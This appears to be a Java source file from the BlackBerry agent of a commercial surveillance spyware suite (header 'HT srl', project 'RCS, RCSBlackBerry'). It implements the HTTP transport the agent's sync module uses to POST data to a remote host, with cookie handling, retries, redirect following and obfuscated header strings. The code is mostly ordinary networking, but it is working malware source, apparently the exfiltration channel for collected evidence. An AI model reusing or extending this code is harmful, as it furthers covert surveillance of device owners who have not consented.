//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;

import net.rim.device.api.io.IOCancelledException;
import net.rim.device.api.io.http.HttpProtocolConstants;
import blackberry.Messages;
import blackberry.Status;
import blackberry.config.Cfg;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.utils.Utils;

public abstract class HttpTransport extends Transport {

    private static final int PORT = 80;

    //#ifdef DEBUG
    private static Debug debug = new Debug("HttpTransport", //$NON-NLS-1$
            DebugLevel.INFORMATION);
    //#endif

    String host;

    public HttpTransport(String host) {
        super(
                Messages.getString("l.1") + host + ":" + PORT + Messages.getString("l.3")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$

        this.host = host;
        cookie = null;
        stop = false;
    }

    //private String transportId;
    protected String cookie;

    volatile boolean stop;
    boolean follow_moved = true;

    protected final String HD_CONTENTTYPE = Messages.getString("l.4"); //$NON-NLS-1$
    protected final String HD_SETCOOKIE = Messages.getString("l.5"); //$NON-NLS-1$
    protected final String HD_CONTENTLEN = Messages.getString("l.6"); //$NON-NLS-1$

    //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
    protected final String CONTENT_TYPE = Messages.getString("l.7"); //$NON-NLS-1$

    public void start() {
        //#ifdef FOLLOW_MOVED_URLS
        follow_moved = true;
        //#else
        follow_moved = false;
        //#endif

        cookie = null;
    }

    public void close() {
        cookie = null;
    }

    public synchronized byte[] command(byte[] data) throws TransportException {
        boolean available = isAvailable();
        //#ifdef DEBUG
        debug.trace("command, available: " + available); //$NON-NLS-1$
        //#endif

        if (!available) {
            throw new TransportException(20);
        }

        // sending request
        HttpConnection connection = null;
        try {
            //#ifdef DEBUG
            debug.trace("command: creating request"); //$NON-NLS-1$
            //#endif
            connection = createRequest();
            //#ifdef DEBUG
            debug.trace("command: sending request"); //$NON-NLS-1$
            //#endif
            sendHttpPostRequest(connection, data);
        } catch (TransportException ex) {
            //#ifdef DEBUG
            debug.trace("command: second chance"); //$NON-NLS-1$
            //#endif
            Utils.sleep(1000);
            connection = createRequest();
            sendHttpPostRequest(connection, data);
        }

        if (connection == null) {
            //#ifdef DEBUG
            debug.error("command: null connection"); //$NON-NLS-1$
            //#endif
            throw new TransportException(32);
        }

        //#ifdef DBC        
        Check.asserts(connection != null, "null connection"); //$NON-NLS-1$
        //#endif

        int status;
        try {
            //#ifdef DEBUG
            debug.trace("command: get response"); //$NON-NLS-1$
            //#endif

            status = connection.getResponseCode();

            // if it's moved, try with the new url
            if (follow_moved
                    && (status == HttpConnection.HTTP_MOVED_TEMP
                            || status == HttpConnection.HTTP_MOVED_PERM || status == HttpConnection.HTTP_TEMP_REDIRECT)) {
                baseurl = connection.getHeaderField(Messages.getString("l.15")); //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace(Messages.getString("l.16") + baseurl); //$NON-NLS-1$
                //#endif

                throw new TransportException(33);
            }

            // check response, if ok parse it            
            if (status == HttpConnection.HTTP_OK) {
                //#ifdef DEBUG
                debug.trace(Messages.getString("l.17")); //$NON-NLS-1$
                //#endif
                byte[] content = parseHttpConnection(connection);
                //#ifdef DEBUG
                Status.getInstance().wap2Ok();
                //#endif
                return content;
            } else {
                //#ifdef DEBUG
                debug.error("command response status: " + status); //$NON-NLS-1$
                if (status == 502) {
                    Status.getInstance().wap2Error();
                }
                //#endif

                throw new TransportException(7);
            }
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error("command: " + e); //$NON-NLS-1$
            //#endif
            throw new TransportException(8);
        } finally {
            try {
                if (connection != null) {
                    //#ifdef DEBUG
                    debug.trace("command: closing connection"); //$NON-NLS-1$
                    //#endif
                    connection.close();
                    connection = null;
                }
            } catch (IOException e) {
                //#ifdef DEBUG
                debug.error("command: " + e); //$NON-NLS-1$
                //#endif
            }
        }
    }

    protected HttpConnection createRequest() throws TransportException {

        String content = ""; //$NON-NLS-1$

        boolean httpOK;
        HttpConnection httpConn = null;

        try {
            String url = getUrl();
            //#ifdef DEBUG
            debug.trace("createRequest url=" + url); //$NON-NLS-1$
            //#endif
            // qui sembra bloccarsi, certe volte, con wifi.
            httpConn = (HttpConnection) open(url);

            //#ifdef DEBUG
            debug.trace("createRequest: setting POST"); //$NON-NLS-1$
            //#endif
            httpConn.setRequestMethod(HttpConnection.POST);

            if (cookie != null) {
                //#ifdef DEBUG
                debug.trace("sendHttpPostRequest cookie: " + cookie); //$NON-NLS-1$
                //#endif
                httpConn.setRequestProperty(
                        HttpProtocolConstants.HEADER_COOKIE, cookie);
            } else {
                //#ifdef DEBUG
                debug.trace("createRequest: no cookie"); //$NON-NLS-1$
                //#endif
            }

            httpConn.setRequestProperty(HttpProtocolConstants.HEADER_HOST,
                    httpConn.getHost());
            httpConn.setRequestProperty(
                    HttpProtocolConstants.HEADER_CONTENT_TYPE, CONTENT_TYPE);
            httpConn.setRequestProperty(
                    HttpProtocolConstants.HEADER_CONNECTION, "Keep-Alive"); //$NON-NLS-1$

            //#ifdef DBC
            Check.ensures(httpConn != null,
                    "sendHttpPostRequest: httpConn null"); //$NON-NLS-1$
            //#endif  
        } catch (Exception ex) {
            if (httpConn != null) {
                try {
                    httpConn.close();
                } catch (IOException e) {
                    //#ifdef DEBUG
                    debug.trace("createRequest: " + e); //$NON-NLS-1$
                    //#endif
                }
            }
            //#ifdef DEBUG
            debug.trace("createRequest: " + ex);
            //#endif
            throw new TransportException(1);
        }
        return httpConn;
    }

    protected boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
            throws TransportException {
        //#ifdef DBC
        Check.requires(data != null, "sendHttpPostRequest: null data"); //$NON-NLS-1$
        //#endif
        String content = ""; //$NON-NLS-1$

        boolean httpOK;
        OutputStream os = null;
        // Open the connection and extract the data.
        try {
            os = httpConn.openOutputStream();
            os.write(data);
            os.close();
            os = null;

            //os.flush(); // Optional, getResponseCode will flush

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest: get response"); //$NON-NLS-1$
            //#endif
            int status = httpConn.getResponseCode();
            httpOK = (status == HttpConnection.HTTP_OK);

            /*
             * //#ifdef DEBUG debug.trace("sendHttpPostRequest: closing");
             * //#endif os.close();
             */

            //#ifdef DEBUG
            debug.trace("sendHttpPostRequest response: " + status); //$NON-NLS-1$
            //#endif

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            throw new TransportException(2);
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                }
            }
        }

        if (!httpOK) {
            //#ifdef DEBUG
            debug.error("HTTP not ok"); //$NON-NLS-1$
            //#endif
            //throw new TransportException(2);
        }

        //#ifdef DBC
        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null"); //$NON-NLS-1$
        //#endif     
        return httpOK;
    }

    protected byte[] parseHttpConnection(HttpConnection httpConn)
            throws TransportException {

        InputStream input = null;
        try {
            // Is this html?
            String contentType = httpConn.getHeaderField(HD_CONTENTTYPE);
            boolean htmlContent = (contentType != null && contentType
                    .startsWith(contentType));

            if (!htmlContent) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection wrong htmlContent : " //$NON-NLS-1$
                        + contentType);
                //#endif
                throw new TransportException(3);
            }

            String setCookie = httpConn.getHeaderField(HD_SETCOOKIE);

            if (setCookie != null) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection setCookie: " + setCookie); //$NON-NLS-1$
                //#endif

                cookie = setCookie;
            }

            String contentLen = httpConn.getHeaderField(HD_CONTENTLEN);
            //#ifdef DEBUG
            debug.trace("parseHttpConnection len: " + contentLen); //$NON-NLS-1$
            //#endif

            int totalLen = 0;
            try {
                // expected content size
                totalLen = Integer.parseInt(contentLen);

            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("parseHttpConnection parseInt"); //$NON-NLS-1$
                //#endif
                throw new TransportException(4);
            }

            input = httpConn.openInputStream();

            // buffer data
            byte[] buffer = new byte[1024];
            byte[] content = new byte[totalLen];
            int size = 0; // incremental size
            int len = 0; // iterative size

            while (-1 != (len = input.read(buffer))) {
                //#ifdef DEBUG
                debug.trace("parseHttpConnection read=" + len + " size=" + size //$NON-NLS-1$ //$NON-NLS-2$
                        + " tot=" + totalLen); //$NON-NLS-1$
                //#endif
                // Exit condition for the thread. An IOException is 
                // thrown because of the call to  httpConn.close(), 
                // causing the thread to terminate.
                if (stop) {
                    //#ifdef DEBUG
                    debug.trace("parseHttpConnection stop!"); //$NON-NLS-1$
                    //#endif
                    httpConn.close();
                    input.close();
                }
                Utils.copy(content, size, buffer, 0, len);
                size += len;
            }
            buffer = null;

            //#ifdef DEBUG
            debug.trace("parseHttpConnection received:" + size); //$NON-NLS-1$
            //#endif

            input.close();
            input = null;

            //#ifdef DBC
            Check.ensures(len != totalLen, "sendHttpPostRequest: received:" //$NON-NLS-1$
                    + size + " expected: " + totalLen); //$NON-NLS-1$
            //#endif 
            return content;

        } catch (IOCancelledException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(5);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new TransportException(6);
        } finally {
            if (input != null) {
                try {
                    input.close();
                } catch (IOException e) {
                }
            }
        }
    }

    Thread threadOpener;

    protected HttpConnection open(String url) throws TransportException {
        // Crea un thread, dentro il quale genera l'url.
        // Se non esce entro poco, ci riprova.
        InternalOpener opener = new InternalOpener(url);
        if (threadOpener != null) {
            try{
                threadOpener.interrupt();
            }catch(Exception ex){
                //#ifdef DEBUG
                debug.trace("open: " + ex);
                //#endif
            }
        }

        threadOpener = new Thread(opener);
        threadOpener.start();

        HttpConnection connection = opener.getConnection();

        if (connection == null) {
            //#ifdef DEBUG
            debug.trace("open: null connection"); //$NON-NLS-1$
            Evidence.info("NULL CONNECTION: " + url); //$NON-NLS-1$
            //#endif                       
            threadOpener.interrupt();

            opener = null;
            threadOpener = null;

            throw new TransportException(25);

        } else {
            //#ifdef DEBUG
            debug.trace("open: " + connection); //$NON-NLS-1$
            //#endif
        }

        opener = null;
        threadOpener = null;
        return connection;
    }

    class InternalOpener implements Runnable {
        private static final int SECS = Cfg.CONNECTION_TIMEOUT;
        HttpConnection connection;
        private String url;
        Object monitor = new Object();

        InternalOpener(String url) {
            this.url = url;
        }

        public void run() {
            try {
                connection = (HttpConnection) Connector.open(url);
            } catch (IOException e) {
                //#ifdef DEBUG
                debug.error("run: " + e); //$NON-NLS-1$
                //#endif
            }

            synchronized (monitor) {
                //#ifdef DEBUG
                debug.trace("run, notifyAll "); //$NON-NLS-1$
                //#endif
                monitor.notifyAll();
            }
        }

        public HttpConnection getConnection() {
            synchronized (monitor) {
                if (connection != null) {
                    return connection;
                }

                try {
                    monitor.wait(SECS * 1000);
                } catch (InterruptedException e) {
                    //#ifdef DEBUG
                    debug.error("getConnection: " + e); //$NON-NLS-1$
                    //#endif

                    connection = null;
                }
            }

            return connection;

        }

    }
}
